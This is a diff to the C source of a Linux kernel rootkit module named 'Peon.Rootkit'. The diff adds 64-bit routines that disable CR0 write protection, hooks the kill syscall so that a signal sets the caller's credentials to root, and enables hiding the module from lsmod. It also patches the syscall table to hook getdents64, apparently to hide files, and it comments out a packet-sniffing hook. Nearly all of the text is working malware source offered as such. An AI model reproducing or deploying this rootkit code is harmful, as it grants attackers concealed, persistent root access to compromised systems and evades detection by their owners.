@@ -14,15 +14,21 @@
 #include <linux/socket.h>
 #include <linux/inet.h>
 #include <linux/limits.h>
+#include <asm/processor.h>
+#include <asm/uaccess.h>
+#include <asm/unistd.h>
 
 #define ETH_P_ALL       0x0003
-#if ( __WORDSIZE == 64 ) //64 bits machine //__WORDSIZE == 64
+
+#if 0//defined(__LP64__) || defined(_LP64)  /* 64 bits machine */
+#define OS_64_BITS 1
 #define KERN_MEM_BEGIN 0xffffffff81000000
 #define KERN_MEM_END 0xffffffff81e42000
-#else
+#else	/* 32 bits machine */
+#define OS_64_BITS 0
 #define KERN_MEM_BEGIN 0xc0000000
 #define KERN_MEM_END 0xd0000000
-#endif /* __WORDSIZE == 64 */
+#endif 
 
 unsigned long **find_syscall_table(void)
 {
@@ -50,30 +56,54 @@ unsigned long **find_syscall_table(void)
 }
 
 
-void disable_wp(void)
-{
+
+void disable_wp(void){
+
+if(OS_64_BITS)	
+
+    __asm__("push   %rax\n\t"
+            "mov    %cr0,%rax;\n\t"
+            "and     $~(1 << 16),%rax;\n\t"
+            "mov    %rax,%cr0;\n\t"
+            "wbinvd\n\t"
+            "pop    %rax"
+           );
+else
+
     __asm__("push   %eax\n\t"
             "mov    %cr0,%eax;\n\t"
             "and     $~(1 << 16),%eax;\n\t"
             "mov    %eax,%cr0;\n\t"
             "wbinvd\n\t"
             "pop    %eax"
-           );
-           
+           );       
 }
 
 void enable_wp(void)
 {
 
-    __asm__("push   %eax\n\t"
+if(OS_64_BITS)	
+	
+	    __asm__("push   %rax\n\t"
+            "mov    %cr0,%rax;\n\t"
+            "or     $(1 << 16),%rax;\n\t"
+            "mov    %rax,%cr0;\n\t"
+            "wbinvd\n\t"
+            "pop    %rax"
+           );
+ 
+ else
+      __asm__("push   %eax\n\t"
             "mov    %cr0,%eax;\n\t"
             "or     $(1 << 16),%eax;\n\t"
             "mov    %eax,%cr0;\n\t"
             "wbinvd\n\t"
             "pop    %eax"
-           );
-           
+           );        
 }
+
+
+
 
 
 /* Adress of the syscall table */
@@ -116,9 +146,9 @@ asmlinkage long hacked_getdents64 (unsigned int fd,  struct linux_dirent64 __use
 return ret;
 }
 
-asmlinkage long (*orig_call) (pid_t pid, int sig);
+asmlinkage long (*kill_orig_call) (pid_t pid, int sig);
 
-asmlinkage long hacked_call( pid_t pid, int sig)
+asmlinkage long kill_hook_call( pid_t pid, int sig)
 {
     
     /* Hacked function */
@@ -126,7 +156,7 @@ asmlinkage long hacked_call( pid_t pid, int sig)
     {
     struct task_struct *cur_task;
     struct cred *credz;
-/*obtain root access*/
+    /* obtain root access in shell*/
     cur_task=current;
     credz=cur_task->cred;
     credz->uid=0;
@@ -135,7 +165,7 @@ asmlinkage long hacked_call( pid_t pid, int sig)
     credz->sgid=0;
     credz->euid=0;
     credz->egid=0;     
-    printk(KERN_ALERT "KILL 88 88 HIJACKED");
+    printk(KERN_ALERT "KILL 88 88:  shell root access");
     }
     
 /*   show hided module  */    
@@ -145,7 +175,7 @@ asmlinkage long hacked_call( pid_t pid, int sig)
     list_add(&mod->list,&find_module("snd")->list);    
     printk(KERN_ALERT "show module");
     }
-    return orig_call(pid,sig);
+    return kill_orig_call(pid,sig);
 }
 
 
@@ -170,20 +200,19 @@ int init_module(void)
     printk(KERN_INFO "System call found at : 0x%lx\n", (unsigned long)syscall_table);
 	
 /*  hide module  lsmod */    
-   // mod=THIS_MODULE;
-   // list_del(&THIS_MODULE->list);
+    mod=THIS_MODULE;
+    list_del(&THIS_MODULE->list);
    
    
-   //remove interfacepacket layer2
-   __dev_remove_pack( &pt );
+
     
     disable_wp();
 
 /*  Save the adress of the original syscall */
-   orig_call= (void *) syscall_table[__NR_kill];
+   kill_orig_call= (void *) syscall_table[__NR_kill];
    
 /*  Replace the syscall in the table */
-  syscall_table[__NR_kill] = (void*) hacked_call;
+  syscall_table[__NR_kill] = (void*) kill_hook_call;
   
   
 /*  Save the adress of the original syscall */
@@ -192,18 +221,19 @@ int init_module(void)
 /*  Replace the syscall in the table */
   syscall_table[__NR_getdents64] = (void*) hacked_getdents64;
   
-  
-  
-/*  stuff for network, call toto function  */
+ /* 
+//remove interfacepacket layer2
+__dev_remove_pack( &pt ); 
+// stuff for network, call toto function  
 pt.type = htons(ETH_P_ALL);
 // pt.dev = 0;
 pt.func = toto;
 dev_add_pack(&pt);
-  
+  */
 
    enable_wp(); 
 	
-    printk(KERN_INFO "Rootkit is loaded!\n");
+    printk(KERN_INFO "Peon.Rootkit is loaded!\n");
 
     return 0;
 }
@@ -214,13 +244,13 @@ void cleanup_module(void)
     disable_wp();
 
     /* Set the orignal call*/
-  syscall_table[/*  Sycall Number*/ __NR_kill] = (void*) orig_call;
+  syscall_table[/*  Sycall Number*/ __NR_kill] = (void*) kill_orig_call;
   
   syscall_table[ __NR_getdents64] = (void*) orig_getdents64;
 
     enable_wp(); 
 
-    printk(KERN_INFO "Rootkit is unloaded!\n");
+    printk(KERN_INFO "Peon.Rootkit is unloaded!\n");
 }
 
 MODULE_LICENSE("GPL");
